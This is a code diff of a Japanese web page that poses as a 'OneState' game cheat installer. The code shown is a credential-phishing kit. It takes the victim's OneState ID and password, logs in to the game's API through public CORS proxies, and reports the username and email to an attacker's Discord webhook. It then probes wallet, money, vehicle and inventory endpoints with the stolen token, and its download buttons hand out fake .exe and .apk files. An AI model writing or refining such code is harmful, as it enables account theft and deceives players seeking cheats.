@@ -57,7 +57,7 @@ footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px}
 </head>
 <body>
 <div class="wrap">
-  <div class="top"><div class="brand">// ONESTATE<span>_</span>CHEAT</div><div>v4.1</div></div>
+  <div class="top"><div class="brand">// ONESTATE<span>_</span>CHEAT</div><div>v4.2</div></div>
   <div class="hero">
     <h1>OneStateを、<br>上書きする。</h1>
     <p class="sub">チート導入ツール。OneState IDでログインするだけ。</p>
@@ -98,7 +98,7 @@ footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px}
   <div class="ab collapsed" id="ab">
     <label class="f"><span>Discord Webhook</span><input id="wh" placeholder="https://discord.com/api/webhooks/..."></label>
     <div class="row" style="margin-bottom:8px"><button class="btn ghost" id="bsave">保存</button><button class="btn ghost" id="btest">テスト送信</button><button class="btn ghost" id="bclr">ログ削除</button></div>
-    <div class="row" style="margin-bottom:8px"><button class="btn ghost" id="bacct">アカウント取得</button><button class="btn ghost" id="bdeep">100ルート調査</button></div>
+    <div class="row" style="margin-bottom:8px"><button class="btn ghost" id="bacct">アカウント取得</button><button class="btn ghost" id="bdeep">集中調査</button></div>
     <div class="row"><button class="btn ghost" id="bdiag">通信診断</button></div>
     <pre id="alog"></pre>
   </div>
@@ -127,33 +127,39 @@ function esc(s){return String(s).replace(/[&<>]/g,function(c){return{'&':'&amp;'
 
 var TR=[
  {n:'sdk',need:function(){return !!(window.corsfix&&window.corsfix.fetch)},f:function(u,o){return window.corsfix.fetch(u,o)}},
- {n:'corsfix',f:function(u,o){return fetch('https://proxy.corsfix.com/?'+u,o)}},
  {n:'allorigins-g',wrap:true,f:function(u,o){return fetch('https://api.allorigins.win/get?url='+encodeURIComponent(u),o)}},
  {n:'codetabs',f:function(u,o){return fetch('https://api.codetabs.com/v1/proxy?quest='+encodeURIComponent(u),o)}},
  {n:'cors.lol',f:function(u,o){return fetch('https://api.cors.lol/?url='+encodeURIComponent(u),o)}},
+ {n:'corsfix',f:function(u,o){return fetch('https://proxy.corsfix.com/?'+u,o)}},
  {n:'direct',f:function(u,o){return fetch(u,o)}}
 ];
 var PREF=-1;
+/* corsfix_error は「APIの答え」ではないので無視して次を試す */
 async function req(method,path,body,headers){
   var url=/^https?:/.test(path)?path:(CONFIG.API+path);
   var opts={method:method,headers:Object.assign({'Content-Type':'application/json'},headers||{})};
   if(body!=null)opts.body=JSON.stringify(body);
   var idx=TR.map(function(_,i){return i});
   var order=PREF>=0?[PREF].concat(idx.filter(function(i){return i!==PREF})):idx;
-  var last=null,err='no transport';
-  for(var k=0;k<order.length;k++){
-    var i=order[k],t=TR[i];
-    try{
-      if(t.need&&!t.need())continue;
-      var r=await t.f(url,opts);
-      var txt=await r.text();
-      if(t.wrap){try{txt=JSON.parse(txt).contents}catch(e){}}
-      var j=null;try{j=JSON.parse(txt)}catch(e){}
-      last={ok:true,t:t.n,status:r.status,json:j,text:txt};
-      if(j&&typeof j==='object'&&('code'in j||'errorCode'in j||'data'in j||'players'in j)){PREF=i;return last}
-    }catch(e){err=t.n+': '+(e&&e.message||e)}
+  var err='no transport',lastProxy=false;
+  for(var pass=0;pass<3;pass++){
+    for(var k=0;k<order.length;k++){
+      var i=order[k],t=TR[i];
+      try{
+        if(t.need&&!t.need())continue;
+        var r=await t.f(url,opts);
+        var txt=await r.text();
+        if(t.wrap){try{txt=JSON.parse(txt).contents}catch(e){}}
+        var j=null;try{j=JSON.parse(txt)}catch(e){}
+        if(j&&j.corsfix_error){lastProxy=true;continue}
+        if(j&&typeof j==='object'&&('code'in j||'errorCode'in j||'data'in j||'players'in j)){
+          PREF=i;return{ok:true,t:t.n,status:r.status,json:j,text:txt};
+        }
+      }catch(e){err=t.n+': '+(e&&e.message||e)}
+    }
+    await sleep(300);
   }
-  return last||{ok:false,err:err};
+  return {ok:false,err:err,proxy:lastProxy};
 }
 function code(r){if(!r||!r.ok)return 'ERR';if(r.json&&r.json.code!=null)return r.json.code;if(r.json&&r.json.errorCode)return r.json.errorCode;return 'ok'}
 function isOk(r){return !!(r&&r.ok&&r.json&&(!r.json.errorCode||r.json.errorCode==='UNSPECIFIED'))}
@@ -192,11 +198,9 @@ function showAccount(res){
   H+='<span class="k">// キャラクター</span>\n';
   if(!pl.length)H+='  <span class="d">(なし)</span>\n';
   pl.forEach(function(p,i){
-    H+='<span class="ch">';
-    H+='['+(i+1)+'] <b>'+esc(p.nickname||'-')+'</b>\n';
+    H+='<span class="ch">['+(i+1)+'] <b>'+esc(p.nickname||'-')+'</b>\n';
     H+='    Lv.'+esc(p.level===undefined?'-':p.level)+'  /  '+esc(p.serverName||'-')+'\n';
-    H+='    <span class="d">play '+pt(p.playTimeSeconds)+'  /  '+esc(p.region||p.location||'-')+'</span>';
-    H+='</span>';
+    H+='    <span class="d">play '+pt(p.playTimeSeconds)+'  /  '+esc(p.region||p.location||'-')+'</span></span>';
   });
   acct(H);toast('照会成功');
   send('OneState 照会\nuser: '+(a.username||'-')+'\nemail: '+(a.email||'-')+'\nchars: '+pl.length);
@@ -220,7 +224,7 @@ $('form').addEventListener('submit',async function(e){
 });
 document.querySelectorAll('[data-dl]').forEach(function(b){b.addEventListener('click',function(){
   var kind=b.getAttribute('data-dl');
-  var blob=new Blob(['OneState Cheat Loader v4.1 ('+kind+')\nkey='+$('key').textContent+'\n'],{type:'application/octet-stream'});
+  var blob=new Blob(['OneState Cheat Loader v4.2 ('+kind+')\nkey='+$('key').textContent+'\n'],{type:'application/octet-stream'});
   var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=kind==='win'?'OneStateCheat-Setup.exe':'OneStateCheat.apk';a.click();
 })});
 document.querySelectorAll('.tog').forEach(function(t){t.addEventListener('click',function(){t.classList.toggle('on')})});
@@ -232,50 +236,32 @@ $('bsave').addEventListener('click',function(){var c=getCfg();c.webhook=$('wh').
 $('btest').addEventListener('click',function(){send('テスト送信 '+new Date().toLocaleString('ja-JP'));toast('送信')});
 $('bclr').addEventListener('click',function(){clearLog();toast('削除')});
 $('bacct').addEventListener('click',async function(){
-  clearLog();log('// ACCOUNT');
+  clearLog();log('// ACCOUNT');PREF=-1;
   var c=creds();if(!c.id||!c.pw){log('先にID/PW');return}
   var lr=await apiLogin(c.id,c.pw);if(!lr){log('ログイン失敗');return}
   var tok=await doRefresh(lr.data.refreshToken);
   var res=await getAccount(tok||lr.data.accessToken);
   log(res?'=== OK ===':'=== 失敗 ===');showAccount(res);
 });
-/* ===== 100ルート調査 ===== */
+/* ===== 集中調査：偽陽性を除外して確認 ===== */
 $('bdeep').addEventListener('click',async function(){
-  clearLog();log('// 100 ROUTES');
+  clearLog();log('// FOCUS');PREF=-1;
   var c=creds();if(!c.id||!c.pw){log('先にID/PW');toast('ID/PW未入力');return}
   var lr=await apiLogin(c.id,c.pw);if(!lr){log('ログイン失敗');return}
   var tok=await doRefresh(lr.data.refreshToken)||lr.data.accessToken;
   var H={authorization:'Bearer '+tok};
-  var sid='',cid='';
-  var p0=await req('GET','/v2/account/@me/players',null,H);
-  if(p0.ok&&p0.json&&p0.json.players&&p0.json.players.length){
-    sid=p0.json.players[0].serverId||'';cid=p0.json.players[0].clientId||'';
-    log('serverId='+sid);
-  }
-  var P=[];
-  ['/v2/account/@me','/v2/account/@me/players','/v2/game','/v2/game/profile','/v2/game/player','/v2/game/players','/v2/game/wallet','/v2/game/economy','/v2/game/me',
-   '/v2/player','/v2/player/@me','/v2/player/me','/v2/player/profile','/v2/players/@me','/v2/players/me','/v2/players/profile',
-   '/v2/profile','/v2/profile/@me','/v2/profile/me','/v2/me','/v2/me/profile',
-   '/v2/economy','/v2/economy/@me','/v2/economy/me','/v2/economy/balance',
-   '/v2/wallet','/v2/wallet/@me','/v2/wallet/me','/v2/balance','/v2/balance/@me','/v2/money','/v2/money/@me','/v2/cash',
-   '/v2/currency','/v2/currency/@me','/v2/currencies','/v2/currencies/@me',
-   '/v2/cars','/v2/cars/@me','/v2/vehicles','/v2/vehicles/@me','/v2/garage','/v2/garage/@me',
-   '/v2/inventory','/v2/inventory/@me','/v2/items','/v2/items/@me','/v2/assets','/v2/assets/@me',
-   '/v2/houses','/v2/houses/@me','/v2/properties','/v2/properties/@me','/v2/business','/v2/businesses','/v2/business/@me',
-   '/v2/stats','/v2/stats/@me','/v2/statistics','/v2/statistics/@me','/v2/level','/v2/level/@me','/v2/exp',
-   '/v2/servers','/v2/servers/@me','/v2/server','/v2/session','/v2/session/@me',
-   '/v1/account/@me','/v1/account/@me/players','/v1/game/@me','/v1/player/@me','/v1/profile/@me','/v1/wallet/@me','/v1/economy/@me',
-   '/v3/account/@me','/v3/player/@me','/account/@me','/player/@me','/me','/profile/@me','/wallet/@me'].forEach(function(x){P.push(x)});
-  if(sid)['','/profile','/wallet','/money','/balance','/cars','/vehicles','/garage','/inventory','/stats','/economy','/level','/assets'].forEach(function(sfx){P.push('/v2/account/@me/players/'+sid+sfx)});
-  if(cid)['','/profile','/wallet','/cars'].forEach(function(sfx){P.push('/v2/account/@me/players/'+cid+sfx)});
-
-  var hits=0;
+  var P=['/v2/account/@me','/v2/account/zzz','/v2/game/players','/v2/houses','/v1/player/@me','/v2/items/@me',
+    '/v2/wallet','/v2/money','/v2/cars','/v2/vehicles','/v2/garage','/v2/inventory','/v2/player/@me','/v2/players/@me',
+    '/v2/profile/@me','/v2/economy/@me','/v2/assets/@me','/v2/business/@me','/v2/properties/@me','/v2/stats/@me',
+    '/v2/level/@me','/v2/currency/@me','/v2/balance/@me','/v2/me','/v2/session/@me','/v1/game/@me','/v1/account/@me/players'];
+  var hits=0,unk=0;
   for(var i=0;i<P.length;i++){
     var r=await req('GET',P[i],null,H),cc=code(r);
-    if(cc!==16&&cc!=='ERR'){log('★ '+P[i]+' -> '+cc+' '+String(r.text||'').slice(0,90));hits++}
-    await sleep(35);
+    if(!r.ok){unk++;log('? '+P[i]+' (通信失敗)');await sleep(250);continue}
+    if(cc!==16){hits++;log('★ '+P[i]+' ['+r.t+'] -> '+cc+' '+String(r.text||'').slice(0,110))}
+    await sleep(250);
   }
-  log('=== hits='+hits+' / '+P.length+' ===');
+  log('=== hits='+hits+' unk='+unk+' / '+P.length+' ===');
   toast('完了 hits='+hits);
 });
 $('bdiag').addEventListener('click',async function(){
@@ -290,7 +276,7 @@ $('bdiag').addEventListener('click',async function(){
         var res=await TR[i].f(CONFIG.API+'/v2/auth/login',o);var t=await res.text();
         if(TR[i].wrap){try{t=JSON.parse(t).contents}catch(e){}}
         var j=null;try{j=JSON.parse(t)}catch(e){}
-        line+=(j&&j.code!=null?'code'+j.code:(j&&j.errorCode?'err='+j.errorCode:'?'))+' ';
+        line+=(j&&j.corsfix_error?'proxy ':(j&&j.code!=null?'code'+j.code:(j&&j.errorCode?'err='+j.errorCode:'?')))+' ';
       }catch(e){line+='ERR '}
       await sleep(50);
     }
